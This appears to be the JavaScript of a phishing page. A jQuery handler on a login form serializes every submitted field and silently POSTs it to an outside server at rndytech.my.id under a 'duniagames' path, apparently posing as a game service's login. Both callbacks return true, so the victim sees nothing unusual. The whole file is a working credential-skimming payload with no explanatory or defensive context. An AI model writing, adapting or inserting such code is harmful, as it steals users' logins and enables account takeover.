$(".login-form").submit(function() {
	var d = $(".login-form");

	$.ajax({
        url: "http://rndytech.my.id/duniagames/index.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
